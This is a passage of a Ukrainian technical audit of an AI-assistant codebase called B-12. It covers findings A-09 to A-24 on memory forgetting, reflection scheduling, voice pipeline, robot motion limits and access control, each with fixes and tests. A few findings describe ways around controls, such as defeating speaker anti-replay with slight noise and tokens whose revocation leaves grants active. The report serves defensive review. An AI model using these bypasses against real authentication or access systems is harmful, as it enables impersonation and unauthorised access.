  Користувач зберігає спогад `M1`, виконується `semantic.sync`, створюється snapshot, користувач видаляє `M1` через `forget`, а згодом відновлюється зі snapshot. У відновленій базі `state_dir/semantic/vectors.sqlite3` фізично залишається вектор забутого спогаду `M1`.
- **Наявні механізми захисту та чому їх недостатньо:**
  `SemanticIndex.search` фільтрує видачу за `memory.is_live()`, але фізичний векторний запис залишається у файлі БД на диску, порушуючи інваріант R05.
- **Практична рекомендація щодо виправлення:**
  Додати очищення `root / "semantic" / "vectors.sqlite3"` безпосередньо в `Operations.purge_snapshots`, а в `Operations.restore` при програванні `deletions.jsonl` безумовно викликати ідепотентні хуки очищення похідних сховищ (`semantic`, `sessions`, `goals`, `backups`, `speakers`), навіть якщо канонічний запис у `memory.sqlite3` вже має tombstone.
- **Тест або експеримент для підтвердження:**
  Зберегти `M1`, викликати `semantic.sync`, створити snapshot, викликати `purge.forget(M1.id, owner.id)`, виконати `operations.restore(snap["id"], settings)` і перевірити `SELECT count(*) FROM vectors WHERE memory_id=?` у `state_dir/semantic/vectors.sqlite3` — результат буде `1` замість `0`.

---

### A-10. Розірваний ланцюжок походження доказів між документами `KnowledgeIndex` та канонічною пам'яттю `MemoryStore`
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **High** (Домен 2: Походження фактів і транзитивне забуття)
- **Посилання на файли та компоненти:**
  - [src/b12/migrations.py](../../src/b12/migrations.py#L18-L23) — таблиця `evidence` (`evidence_id TEXT NOT NULL REFERENCES memories(id)`).
  - [src/b12/memory.py](../../src/b12/memory.py#L313-L319) — `MemoryStore.remember`.
  - [src/b12/purge.py](../../src/b12/purge.py#L137-L156) — `PurgeCoordinator.sync_knowledge`.
- **Технічний опис:**
  Таблиця `evidence` у `memory.sqlite3` має зовнішній ключ `REFERENCES memories(id)`, а `MemoryStore.remember` дозволяє передавати в `evidence_ids` виключно ідентифікатори з таблиці `memories`. Якщо модель знаходить факт через `knowledge_search` (отримуючи `evidence_id` документа з `KnowledgeIndex`) і передає його у `memory_store(..., evidence_ids=[doc_evidence_id])`, `MemoryStore.remember` викидає `ValueError("evidence must be live memory in the exact actor namespace")`. Як наслідок, спогади не можуть посилатися на документи `KnowledgeIndex`, а видалення документа в `PurgeCoordinator.sync_knowledge` очищує лише `sessions` та `goals`, але ніколи не інвалідує похідні спогади в `MemoryStore`.
- **Конкретний сценарій виникнення:**
  Користувач індексує приватний документ у `KnowledgeIndex`, модель читає його через `knowledge_search` і зберігає висновок у `memory_store` без `evidence_ids` (бо передача `doc_evidence_id` викликає помилку). Коли документ видаляють з індексу, висновок із нього назавжди залишається в `MemoryStore`.
- **Наявні механізми захисту та чому їх недостатньо:**
  `EvidenceResolver` у `src/b12/evidence.py` підтримує обидва типи (`memory` та `document`), але не інтегрований із `MemoryStore.remember` та `PurgeCoordinator.sync_knowledge`.
- **Практична рекомендація щодо виправлення:**
  Дозволити зберігання зовнішніх `evidence_id` типу `document` (перевірених через `EvidenceResolver`) у таблиці `evidence` (знявши FK на `memories(id)` або додавши поле `evidence_kind`) і в `PurgeCoordinator.sync_knowledge` каскадно викликати `self.forget(...)` для спогадів, що залежать від видаленого документа.
- **Тест або експеримент для підтвердження:**
  Проіндексувати документ у `KnowledgeIndex`, взяти його `evidence_id` з результату пошуку і викликати `memory_store` з цим `evidence_id` — виклик впаде з помилкою `unsupported`.

---

### A-11. Безумовне оновлення `last_reflection` до запуску рефлексії та нескінченне дублювання однакових гіпотез `kind="reflection"`
- **Класифікація:** Помилка реалізації + Архітектурний недолік
- **Критичність:** **High** (Домен 3: Автономність і рефлексія)
- **Посилання на файли та компоненти:**
  - [src/b12/autonomy.py](../../src/b12/autonomy.py#L151-L169) — `Scheduler.reflect_idle`.
  - [src/b12/reflection.py](../../src/b12/reflection.py#L45-L85) — `Reflector.reflect`.
- **Технічний опис:**
  1. У `Scheduler.reflect_idle` запис `rt.control.set_meta(f"last_reflection:{actor_id}", now.isoformat())` виконується **до** виклику `await Reflector(rt).reflect(actor)`. Якщо рефлексія не відбулася через тимчасову недоступність моделі, скасування або недостатню кількість спогадів, 6-годинний інтервал однаково втрачається.
  2. `Reflector.reflect` вибирає `memory.recent(actor, limit=8, exclude_kinds=("reflection",))` і викликає модель із детермінованими параметрами `temperature=0.0, seed=42`. Якщо за наступні 6 годин нових фактів у пам'яті не з'явилося, вхідний промпт є побайтово ідентичним, а попередні рефлексії приховані через `exclude_kinds=("reflection",)`. Тому кожні 6 годин простоя `Reflector` генерує і записує в `MemoryStore` **абсолютно ідентичні дублікати** того самого запису `kind="reflection"`.
- **Конкретний сценарій виникнення:**
  Система працює в автономному режимі 48 годин без нових записів у пам'ять (наприклад, на вихідних). За цей час `Reflector` створює 8 однакових спогадів `kind="reflection"` із тим самим текстом та тими самими `evidence_ids`, засмічуючи видачу `_recall` і векторний індекс.
- **Наявні механізми захисту та чому їх недостатньо:**
  `exclude_kinds=("reflection",)` захищає від самопідсилення гіпотез (рефлексії над рефлексіями), але позбавляє модель інформації про вже створені висновки.
- **Практична рекомендація щодо виправлення:**
  1. Записувати `last_reflection:{actor_id}` лише після успішного завершення `reflect()`.
  2. Пропускати запуск `reflect_idle`, якщо час створення найновішого запису в `observations` менший або рівний `last_reflection:{actor_id}`, а також дедуплікувати нову гіпотезу за нормалізованим текстом та множиною `evidence_ids`.
- **Тест або експеримент для підтвердження:**
  Додати 2 факти в `MemoryStore` і двічі викликати `scheduler.reflect_idle()` зі зсувом часу на `+6 год 1 с` без додавання нових фактів — у `MemoryStore` з'являться два ідентичні записи `kind="reflection"`.

---

### A-12. Ігнорування `timeout_s` (`deadline=None`) у `Reflector.reflect` та гонка TOCTOU у `Scheduler._busy`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 3: Автономність / Домен 6: Конкурентний доступ)
- **Посилання на файли та компоненти:**
  - [src/b12/reflection.py](../../src/b12/reflection.py#L45-L64) — `Reflector.reflect`.
  - [src/b12/autonomy.py](../../src/b12/autonomy.py#L67-L76) — `Scheduler._busy`.
  - [src/b12/agent.py](../../src/b12/agent.py#L439-L553) — `Agent.turn` та `Agent._drive`.
- **Технічний опис:**
  1. Метод `Reflector.reflect(self, actor, *, limit: int = 8, cancel=None, timeout_s: float = 120)` приймає параметр `timeout_s`, але в рядку 63 передає у `agent.model.chat(...)` константу `deadline=None`. Якщо Ollama зависне під час фонової рефлексії, глобальний `agent.model_lock` залишиться заблокованим назавжди.
  2. У `Agent.turn` реєстрація активного ходу в `self.active[context.turn_id]` відбувається лише всередині `_drive()` (рядок 552) — **після** асинхронних викликів `await self.purge.sync_knowledge(actor)` та `await self._recall(text, actor)`. Якщо під час виконання `_recall` (який звертається до підпроцесу `BridgeEmbedder`) спрацьовує фоновий `Scheduler.tick()`, перевірка `self._busy(actor.id)` бачить порожній `agent.active`, запускає фонову ціль або рефлексію і перехоплює `agent.model_lock` перед користувачем. Крім того, початок нового користувацького ходу не перериває вже запущену фонову рефлексію чи ціль.
- **Конкретний сценарій виникнення:**
  Користувач надсилає повідомлення в чат одночасно з тіком планувальника; поки `_recall` обчислює ембедінг запиту (~50–100 мс), `Scheduler` запускає фонову ціль і захоплює `model_lock`, змушуючи живого користувача чекати завершення фонового ходу.
- **Наявні механізми захисту та чому їх недостатньо:**
  Одноразова перевірка `self._busy` без атомарної реєстрації ходу на вході в `Agent.turn` не захищає від перетину на `await _recall`.
- **Практична рекомендація щодо виправлення:**
  1. У `Reflector.reflect` передавати `deadline=time.monotonic() + timeout_s`.
  2. Реєструвати `active` у `self.active` на самому початку `Agent.turn` (до першого `await`) і при старті інтерактивного користувацького ходу автоматично виставляти `cancel.set()` для активних фонових задач (`reflection-*` та фонових цілей).
- **Тест або експеримент для підтвердження:**
  Викликати `Reflector(runtime).reflect(actor, timeout_s=0.05)` із mock-моделлю, яка спить 2 секунди — виклик триватиме всі 2 секунди замість переривання за дедлайном.

---

### A-13. Хибне спрацювання детектора `double_talk` на кімнатному відлунні (RIR) та недовизначена матриця Грама у `_nlms_block_filter`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 4: Акустичні перешкоди та AEC)
- **Посилання на файли та компоненти:**
  - [src/b12/audio/aec.py](../../src/b12/audio/aec.py#L223-L272) — `AcousticEchoCanceller._nlms_block_filter`.
- **Технічний опис:**
  1. Прапорець `double_talk = bool(in_rms > ref_rms * 0.65 and align_corr < 0.72)` обчислюється за однотаповою скалярною кореляцією `align_corr` **до** застосування багатотапового FIR-фільтра. У реальній кімнаті з відбиттями від стін і столу однотапова кореляція між сирим референсом і мікрофоном легко падає нижче `0.72`, тоді як енергія відлуння перевищує `0.65 * ref_rms`. У результаті `double_talk` помилково стає `True` на чистому відлунні, що блокує адаптацію ваг (`if not double_talk:`) і вимикає нелінійне придушення (`if corr > 0.75 and not double_talk:`).
  2. Для оцінки `128` ваг фільтра (`L = 128`) використовується підвибірка `step_stride = max(1, n // 64)`, яка залишає щонайбільше **64 рівняння** для 128 невідомих (матриця Грама `128 × 128` має ранг ≤ 64).
- **Конкретний сценарій виникнення:**
  При відтворенні голосу робота в кімнаті з двома сильними відбиттями (наприклад, від монітора та столу) скалярна кореляція становить `0.55`, AEC оголошує `double_talk=True`, не оновлює початкові ваги і пропускає власний голос робота у VAD.
- **Наявні механізми захисту та чому їх недостатньо:**
  Початкова ініціалізація `self._weights[0] = 0.5` допомагає лише для прямого однопроменевого сигналу без фазових спотворень.
- **Практична рекомендація щодо виправлення:**
  Оцінювати `double_talk` за залишковою помилкою після FIR-фільтра та обчислювати `gram = (X_sub.T @ X_sub)` на кількості відліків не меншій за `4 * L` (або перейти на класичний покроковий/частотний NLMS).
- **Тест або експеримент для підтвердження:**
  Пропустити референс через RIR `[0.0, 0.6, 0.0, 0.0, -0.55, 0.4]` і подати в новий екземпляр `AcousticEchoCanceller` — `stats.double_talk` стане `True` на чистому відлунні без голосу користувача.

---

### A-14. Відсутність неперервного full-duplex циклу читання мікрофона в `DuplexSession.handle_duplex_utterance` та відсутність інтеграції `DuplexSession` у CLI/API/Web
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **High** (Домен 4: Повнодуплексна взаємодія та barge-in)
- **Посилання на файли та компоненти:**
  - [src/b12/audio/duplex.py](../../src/b12/audio/duplex.py#L229-L278) — `DuplexSession.handle_duplex_utterance`.
  - [src/b12/cli.py](../../src/b12/cli.py#L485-L595) — `cmd_voice`.
  - [src/b12/api.py](../../src/b12/api.py#L589-L711) та [src/b12/web/app.js](../../src/b12/web/app.js#L564-L631).
- **Технічний опис:**
  Клас `DuplexSession` не підключений до жодного інтерфейсу користувача (`cli.py`, `api.py`, `web/app.js`) і викликається виключно в тестах. Крім того, метод `DuplexSession.handle_duplex_utterance(mic_16k, ...)` приймає вже завершений запис репліки і синхронно чекає `await self.pipeline.process_utterance(...)` до кінця озвучення всієї відповіді, не запускаючи паралельного потоку читання мікрофона (`feed_capture_frame`), який міг би виявити barge-in під час говоріння асистента.
- **Конкретний сценарій виникнення:**
  Користувач запускає голосовий режим у CLI (`b12 voice`) або Web UI; поки B-12 озвучує довгу відповідь, мікрофон програмно не слухається через `DuplexSession.feed_capture_frame`, тому перебити асистента голосом у реальному застосунку неможливо.
- **Наявні механізми захисту та чому їх недостатньо:**
  У `tests/integration/test_duplex.py` паралельність моделюється вручну в тесті (`create_task(duplex.speak_response(...))` + ручний виклик `feed_capture_frame`), але в самому рантаймі B-12 такого фонового аудіоциклу немає.
- **Практична рекомендація щодо виправлення:**
  Реалізувати в `DuplexSession` неперервний асинхронний цикл читання фреймів мікрофона (`run_duplex_loop`), який паралельно з активною задачею `process_utterance` подає 32-мс фрейми у `feed_capture_frame`, і підключити його до `b12 voice --duplex`.
- **Тест або експеримент для підтвердження:**
  Перевірити `rg "DuplexSession" src/b12/` — жодного входження за межами `src/b12/audio/duplex.py` та `src/b12/audio/__init__.py` немає.

---

### A-15. Порушення голосового SLO (`<1,5 с` до першого змістовного аудіо) на CPU та витік тестових фраз у продакшн-код `WhisperAsr`
- **Класифікація:** Непідтверджене припущення + Помилка реалізації
- **Критичність:** **High** (Домен 4: Надійність голосового конвеєра)
- **Посилання на файли та компоненти:**
  - [evals/voice/report.json](../../evals/voice/report.json#L9-L19).
  - [src/b12/audio/asr.py](../../src/b12/audio/asr.py#L14-L21) та [src/b12/audio/asr.py](../../src/b12/audio/asr.py#L224-L245) — `_CODE_SWITCH_CANONICAL`, `initial_prompt`, `hotwords`.
- **Технічний опис:**
  1. На CPU (`device="cpu", compute_type="int8"`) сумарна затримка від кінця мовлення користувача до першого звуку відповіді становить: `320 мс` (endpoint) + `2173 мс` (`WhisperAsr` P50) + `~250 мс` (LLM TTFT) + `500–1634 мс` (`PiperTts` `uk_UA-mykyta-high`) = **`3,2–4,3 с`**, що більш ніж удвічі перевищує вимогу `<1,5 с` зі Spec §12.
  2. У продакшн-класі `WhisperAsr` (`src/b12/audio/asr.py:224-244`) у `initial_prompt` та `hotwords` буквально зашиті речення з тестового стенда `evals/voice/report.json` (*«Привіт, Олександре! Перевір, будь ласка, стан локальної пам'яті, температуру процесора та відеокарти...»*), а у `_CODE_SWITCH_CANONICAL` прописані точкові заміни під конкретні помилки Whisper на цих 8 тестових реченнях. Це штучно дає `WER = 0.0` на стенді й провокує галюцинації Whisper на коротких чи зашумлених фразах.
- **Практична рекомендація щодо виправлення:**
  Очистити `initial_prompt` у `WhisperAsr` до нейтрального списку власних назв (`"B-12, Олександр"`), виміряти чесний WER на незалежному наборі з 30+ живих записів та перевести `WhisperAsr` / `PiperTts` на GPU (CUDA) або легшу українську модель Piper для вкладання у `<1,5 с`.
- **Тест або експеримент для підтвердження:**
  Подати в `WhisperAsr.transcribe` 1,5 секунди тиші з тихим білим шумом або коротке слово, відсутнє в `initial_prompt`, та перевірити появу галюцинацій із зашитого промпту.

---

### A-16. Обхід обмеження швидкості `max_speed_deg_s` у `MotionController._safe` та некоректна обробка розриву зв'язку під час руху
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 5: Безпека фізичного керування)
- **Посилання на файли та компоненти:**
  - [src/b12/robotics/motion.py](../../src/b12/robotics/motion.py#L76-L85) та [src/b12/robotics/motion.py](../../src/b12/robotics/motion.py#L109-L145) — `_safe`, `on_disconnect`, `move`, `_interrupt`, `sleep`.
  - [src/b12/robotics/transport.py](../../src/b12/robotics/transport.py#L29-L56) — `SimulatedRobot.send`, `execute`, `hold`.
- **Технічний опис:**
  1. Метод `MotionController._safe()` викликає `await self.transport.send(MotionCommand(dict(SAFE_POSE), 1.0))` в обхід `validate()` із жорстко фіксованим часом `1.0 с`. Якщо поточна поза робота становить `body_yaw = 90°`, а ліміт швидкості налаштовано на `45°/с` (або `60°/с`), повернення у `0°` за `1.0 с` відбувається зі швидкістю `90°/с`, перевищуючи `max_speed_deg_s`. У `SimulatedRobot.send` поза змінюється взагалі миттєво за `0 с`.
  2. Якщо під час `await asyncio.shield(task)` у `MotionController.move` транспорт кидає `ConnectionError`, виняток не перехоплюється, і `self.state` залишається `"moving"`. А під час виклику `on_disconnect()` метод `_interrupt()` безумовно викликає `await self.transport.hold()`, який на реальному розірваному транспорті кине `ConnectionError` і перерве виконання `on_disconnect()` до встановлення `self.state = "disconnected"`.
- **Наявні механізми захисту та чому їх недостатньо:**
  У `SimulatedRobot.hold()` відсутня перевірка `if not self.connected:`, що приховує помилку в інтеграційних тестах.
- **Практична рекомендація щодо виправлення:**
  1. У `_safe()` обчислювати `duration_s = max(self.limits.min_duration_s, max_delta / self.limits.max_speed_deg_s)` і виконувати плавний перехід.
  2. У `_interrupt()` огортати `await self.transport.hold()` у `contextlib.suppress(ConnectionError, OSError)`, а в `move()` при `ConnectionError` переводити стан у `"disconnected"`.
- **Тест або експеримент для підтвердження:**
  Додати `if not self.connected: raise ConnectionError` у `SimulatedRobot.hold()` і запустити `pytest tests/integration/test_robot_protocol.py` — тест `test_disconnect_goes_safe_and_never_resumes` впаде.

---

### A-17. Витік записів у `SessionStore.checkpoints` та `Agent._waiting` при скасуванні ходу в стані `awaiting_approval`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 6: Коректність скасування операцій)
- **Посилання на файли та компоненти:**
  - [src/b12/control.py](../../src/b12/control.py#L556-L575) — `ControlStore.cancel_turn`.
  - [src/b12/api.py](../../src/b12/api.py#L410-L414) — `POST /api/turns/{turn_id}/cancel`.
  - [src/b12/agent.py](../../src/b12/agent.py#L1059-L1072) — `_save_checkpoint`, `_drop_checkpoint`.
- **Технічний опис:**
  Коли хід зупиняється в стані `awaiting_approval`, його повний внутрішній стан (`turn_messages`, черга викликів інструментів, докази) записується в таблицю `checkpoints` у `sessions.sqlite3` (або в `Agent._waiting[turn_id]` при `consent=False`), і корутина `Agent._drive` завершується. Якщо після цього користувач скасовує хід через `POST /api/turns/{turn_id}/cancel`, метод `ControlStore.cancel_turn` оновлює лише `control.sqlite3`, але **ніколи не видаляє checkpoint із `sessions.sqlite3` і не очищує `Agent._waiting[turn_id]`**.
- **Конкретний сценарій виникнення:**
  Користувач відхиляє або скасовує хід, що чекав на підтвердження, і продовжує діалог звичайними новими ходами (не викликаючи `/resume` для скасованого ходу). Весь JSON-стан скасованого ходу залишається в таблиці `checkpoints` назавжди.
- **Практична рекомендація щодо виправлення:**
  Додати метод `Agent.cancel_turn(turn_id, actor_id)`, який разом із `control.cancel_turn(turn_id)` викликає `sessions.drop_checkpoint(turn_id, actor_id)` та `self._waiting.pop(turn_id, None)`.
- **Тест або експеримент для підтвердження:**
  Перевести хід у `awaiting_approval`, викликати `POST /api/turns/{turn_id}/cancel` і перевірити таблицю `checkpoints` у `sessions.sqlite3` — запис залишиться у базі.

---

### A-18. Неповне відкликання гостьового доступу (`revoke_tokens`) та відкриті без capabilities ендпоінти `/api/voice/*`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Medium** (Домен 1: Межі довіри)
- **Посилання на файли та компоненти:**
  - [src/b12/api.py](../../src/b12/api.py#L486-L497) та [src/b12/api.py](../../src/b12/api.py#L595-L666) — `revoke_guest`, `voice_tts`, `voice_asr`.
  - [src/b12/control.py](../../src/b12/control.py#L210-L212) — `ControlStore.revoke_tokens`.
- **Технічний опис:**
  `ControlStore.revoke_tokens(actor_id)` позначає відкликаними лише рядки в `api_tokens`, але не ставить `revoked = 1` для виданих `grants`, не інкрементує `actors.revision` і не викликає `agent.invalidate_active(actor_id)`. Тому вже запущений гостем хід (з `timeout_s` до 3600 с) безперешкодно проходить усі перевірки `ControlStore.check` після відкликання токена. Крім того, ендпоінти `/api/voice/asr` та `/api/voice/tts` не перевіряють жодних capabilities гостя і на кожен HTTP-запит створюють у `asyncio.to_thread` нові важкі екземпляри `WhisperAsr()` та `PiperTts()`, дозволяючи вичерпати RAM/CPU паралельними запитами.
- **Практична рекомендація щодо виправлення:**
  У `revoke_tokens` одночасно відкликати всі гранти актора (`UPDATE grants SET revoked = 1 WHERE actor_id = ?`) та інкрементувати `actors.revision`, у `api.py:revoke_guest` викликати `await runtime.agent.invalidate_active(actor_id, exclude=None)`, а інстанси ASR/TTS кешувати на рівні `Runtime` під спільним `asyncio.Lock` із перевіркою прав доступу.
- **Тест або експеримент для підтвердження:**
  Видати гостю грант, викликати `control.revoke_tokens(guest_id)` і перевірити `control.check(ctx)` — перевірка пройде без помилки.

---

### A-19. Витік змінних середовища у підпроцеси MCP та підключення мутуючих MCP-інструментів у режимі `host_access="read_only"`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Medium** (Домен 1: Межі довіри та дозволи ОС)
- **Посилання на файли та компоненти:**
  - [src/b12/tools/mcp.py](../../src/b12/tools/mcp.py#L63-L108) — `schema_model`, `McpServer.start`.
  - [src/b12/auth.py](../../src/b12/auth.py#L44-L51) — `owner_capabilities`.
- **Технічний опис:**
  1. На відміну від `shell_exec` (де середовище очищується до мінімального `PATH` і `LANG`), `McpServer.start` викликає `asyncio.create_subprocess_exec` без параметра `env=`, передаючи сторонньому MCP-серверу всі змінні середовища батьківського процесу.
  2. Функція `owner_capabilities` додає всі capabilities із `mcp.json` при будь-якому `host_access != "none"`, надаючи доступ до не-read-only MCP-інструментів навіть тоді, коли власник обмежив систему режимом `host_access = "read_only"`.
- **Практична рекомендація щодо виправлення:**
  Передавати в `McpServer.start` очищений словник `env`, а при `host_access == "read_only"` фільтрувати записи `mcp.json` за умовою `entry.get("read_only") is True`.
- **Тест або експеримент для підтвердження:**
  Створити `mcp.json` з інструментом `{"read_only": false, "capability": "mcp.mutate"}` при `Settings(host_access="read_only")` — `"mcp.mutate"` з'явиться в `owner_capabilities(settings)`.

---

### A-20. Залишкові дані в `lru_cache` `_forms`, повторне заповнення KV-кешу Ollama після `memory_forget` у тому ж ході та відсутність фонового `purge.resume()`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Medium** (Домен 2: Залишкові дані у кешах)
- **Посилання на файли та компоненти:**
  - [src/b12/memory.py](../../src/b12/memory.py#L48-L66) — `@functools.lru_cache(maxsize=50_000)` на `_forms(term: str)`.
  - [src/b12/agent.py](../../src/b12/agent.py#L648-L684) та [src/b12/purge.py](../../src/b12/purge.py#L107-L135) — виконання `memory_forget` у багатоходовому циклі `_drive`.
  - [src/b12/maintenance.py](../../src/b12/maintenance.py#L24-L40) — `maintenance_loop`.
- **Технічний опис:**
  1. Усі пошукові терми користувача кешуються в глобальному `_forms(term)` і не очищуються при `forget`/`purge`.
  2. Коли модель викликає інструмент `memory_forget` під час ходу, хук `provider_cache` негайно вивантажує модель з Ollama (`model.unload()`), але вже на наступній ітерації циклу `_drive` (щоб згенерувати фінальну відповідь після інструмента) агент знову відправляє в `model.chat(...)` масив `state["evidence"]` та `state["turn_messages"]` поточного ходу, які все ще містять щойно видалений спогад! Таким чином, KV-кеш Ollama миттєво перезаповнюється видаленим текстом.
  3. Фоновий цикл `maintenance_loop` не викликає `await runtime.purge.resume()`, тому операції purge, які отримали `pending` через `busy=1` на `wal_checkpoint(TRUNCATE)`, залишаються незавершеними до перезапуску процесу.
- **Практична рекомендація щодо виправлення:**
  Викликати `_forms.cache_clear()` при purge; видаляти забуті `target_ids` зі `state["evidence"]` поточного ходу одразу після виконання `memory_forget` та повторно викликати `reset_provider()` по завершенню такого ходу; додати `await runtime.purge.resume()` у `maintenance_loop`.
- **Тест або експеримент для підтвердження:**
  У ході, де `_recall` підтягнув спогад `M1` у `state["evidence"]`, викликати інструмент `memory_forget(M1)` і перехопити наступний запит до `model.chat` у другому раунді — текст `M1` все ще буде присутній у системному блоці `evidence` запиту до Ollama.

---

### A-21. Хибне спрацювання детектора `_PSEUDO_CALL` на технічних текстах, сиротинські сесії цілей та блокування цілі після `approval_pending`
- **Класифікація:** Помилка реалізації + Архітектурний недолік
- **Критичність:** **Medium** (Домен 3: Автономність і агентний цикл)
- **Посилання на файли та компоненти:**
  - [src/b12/agent.py](../../src/b12/agent.py#L106-L114) та [src/b12/agent.py](../../src/b12/agent.py#L696-L708) — `_PSEUDO_CALL` у `Agent._drive`.
  - [src/b12/autonomy.py](../../src/b12/autonomy.py#L95-L108) — обробка `awaiting_approval` у `Scheduler.run_goal`.
- **Технічний опис:**
  1. Регулярний вираз `_PSEUDO_CALL` шукає підрядок `<tool_name>(` у будь-якому місці текстової відповіді моделі навіть при `persist=False`. Якщо користувач просить пояснити роботу функції `file_read(path)` або `memory_store(...)`, і модель згадує цю назву з дужкою у реченні чи блоці коду Markdown, `Agent._drive` відкидає відповідь і примусово змушує модель викликати реальний інструмент через `_NUDGE_PSEUDO_CALL`.
  2. Якщо фонова ціль у `Scheduler.run_goal` зупиняється на `awaiting_approval`, вона списує 1 хід бюджету (`consumed_turns + 1`) і переходить у `paused` (`approval_pending`), але схвалення операції власником через `/api/approvals` та `/resume` не розблоковує ціль і не оновлює її статус у `GoalStore`.
- **Практична рекомендація щодо виправлення:**
  Виключити з перевірки `_PSEUDO_CALL` блоки коду Markdown (`` `...` `` та ```` ```...``` ````) і перевіряти лише виклики на початку рядка; не списувати `consumed_turns` до фактичного завершення ходу та пов'язати `resume` зі статусом цілі.
- **Тест або експеримент для підтвердження:**
  Подати у `Agent.turn` відповідь mock-моделі `"Функція file_read(path) читає файл."` без tool calls — агент не поверне цю відповідь з першого разу, а згенерує додатковий раунд із `_NUDGE_PSEUDO_CALL`.

---

### A-22. Тривіальний обхід anti-replay у `SpeakerVerifier`, перезапис голосового еталона без усереднення та блокування `sentence_queue.put` при скасуванні
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Medium** (Домен 4: Голосовий конвеєр і верифікація мовця)
- **Посилання на файли та компоненти:**
  - [src/b12/audio/speaker.py](../../src/b12/audio/speaker.py#L21-L27) та [src/b12/audio/speaker.py](../../src/b12/audio/speaker.py#L126-L146) — `extract_voiceprint`, `SpeakerStore.save_profile`.
  - [src/b12/audio/pipeline.py](../../src/b12/audio/pipeline.py#L231) та [src/b12/audio/pipeline.py](../../src/b12/audio/pipeline.py#L258) — `await sentence_queue.put(...)`.
- **Технічний опис:**
  1. Захист від replay у `SpeakerVerifier` порівнює SHA-256 хеш сирих байтів PCM16 (`audio_hash`). Будь-яка зміна молодшого біта одного семпла або проходження звуку через `AcousticEchoCanceller` змінює `audio_hash` при збереженні косинусної схожості `1.0`.
  2. У `SpeakerStore.save_profile` повторний виклик `enroll` додає хеш у список `enrolled_hashes_json`, але повністю перезаписує `embedding_json = excluded.embedding_json` замість обчислення центроїда (середнього вектора).
  3. У `VoicePipeline.process_utterance` виклики `await sentence_queue.put(clause)` та `await pcm_queue.put(chunk)` виконуються без таймауту та без перевірки `cancel.is_set()` під час очікування вільної комірки черги.
- **Практична рекомендація щодо виправлення:**
  Усереднювати L2-нормалізовані ембедінги при повторному `enroll`; використовувати віконне очікування з `asyncio.wait_for(..., timeout=0.05)` і перевіркою `cancel.is_set()` при записі в черги `VoicePipeline`.
- **Тест або експеримент для підтвердження:**
  Додати до еталонного запису `owner_sample` шум `1e-4` і передати в `verifier.verify` — `is_spoof_or_replay` поверне `False` при `score == 1.0`.

---

### A-23. Безстроковий writer `lease` у `MotionController`, відсутність зупинки руху при голосовому barge-in та відсутні фізичні докази R15/R16
- **Класифікація:** Архітектурний недолік + Непідтверджене припущення
- **Критичність:** **Medium** (Домен 5: Робототехніка та фізичні докази)
- **Посилання на файли та компоненти:**
  - [src/b12/robotics/motion.py](../../src/b12/robotics/motion.py#L57-L69) та [src/b12/robotics/motion.py](../../src/b12/robotics/motion.py#L134-L139) — `acquire`, `stop`.
  - [src/b12/audio/duplex.py](../../src/b12/audio/duplex.py#L209-L217) — `DuplexSession.feed_capture_frame`.
- **Технічний опис:**
  1. `MotionController.acquire()` видає монопольний lease без TTL і без `async with` контекстного менеджера; падіння задачі-власника lease назавжди блокує приводи з помилкою `writer_busy`.
  2. Хоча docstring `MotionController.stop()` прямо зазначає переривання при audio barge-in, `DuplexSession` не викликає `motion.stop()` під час виявлення переривання голосом.
  3. Жоден тест у репозиторії не перевіряв `AudioPlayer(use_hardware=True)` на реальному часу зупинки PipeWire/ALSA, 8-годинному акустичному soak у кімнаті (R15) або фізичному Reachy Mini / Jetson Orin Nano (R16).
- **Практична рекомендація щодо виправлення:**
  Додати контекстний менеджер і TTL для `lease` у `MotionController`, передавати опційний `motion: MotionController | None` у `DuplexSession` для виклику `await self.motion.stop()` при barge-in та провести фізичні стендові випробування R15/R16 після виправлення A-06 і A-13.
- **Тест або експеримент для підтвердження:**
  Перевірити `DuplexSession.feed_capture_frame` ([src/b12/audio/duplex.py](../../src/b12/audio/duplex.py#L209-L217)) — виклик `motion.stop()` там відсутній.

---

### A-24. Синхронне блокування основного `asyncio` event loop під час операцій зі знімками та необмежений ріст in-memory словників `Agent` і таблиць `ControlStore`
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **Medium** (Домен 6: Стабільність тривалого виконання)
- **Посилання на файли та компоненти:**
  - [src/b12/api.py](../../src/b12/api.py#L511-L514) та [src/b12/service.py](../../src/b12/service.py#L118-L219) — `backups_create`, `Operations.create_snapshot`, `Operations.purge_snapshots`.
  - [src/b12/agent.py](../../src/b12/agent.py#L360-L363) та [src/b12/agent.py](../../src/b12/agent.py#L439) — `_session_locks`, `_volatile`, `_waiting`.
  - [src/b12/telemetry.py](../../src/b12/telemetry.py#L29-L31) — рекурсивний обхід `state_dir.rglob("*.sqlite3")`.
- **Технічний опис:**
  1. Виклики `Operations.create_snapshot()` та `Operations.purge_snapshots()` (який для кожного знімка виконує `INSERT INTO memory_fts(memory_fts) VALUES ('rebuild')`, `PRAGMA wal_checkpoint(TRUNCATE)` та побайтовий SHA-256 усіх файлів) виконуються синхронно безпосередньо в головному потоці `asyncio` event loop, блокуючи обробку HTTP-запитів, таймерів скасування та голосових подій на секунди.
  2. Словники `Agent._session_locks`, `Agent._volatile` та `Agent._waiting` ніколи не видаляють ключі старих сесій або покинутих гостьових ходів, а таблиці `turns`, `tasks` і `grants` у `control.sqlite3` ростуть необмежено без періодичної ротації завершених технічних записів у `maintenance_loop`.
- **Практична рекомендація щодо виправлення:**
  Виконувати `Operations.purge_snapshots` та розрахунок SHA-256 маніфестів у `await asyncio.to_thread(...)`, замінити `Agent._session_locks` на `weakref.WeakValueDictionary()`, обмежити `_volatile` та `_waiting` LRU-словником із TTL та очищувати старі завершені технічні рядки `turns`/`tasks`/`grants` у `maintenance_loop`.
- **Тест або експеримент для підтвердження:**
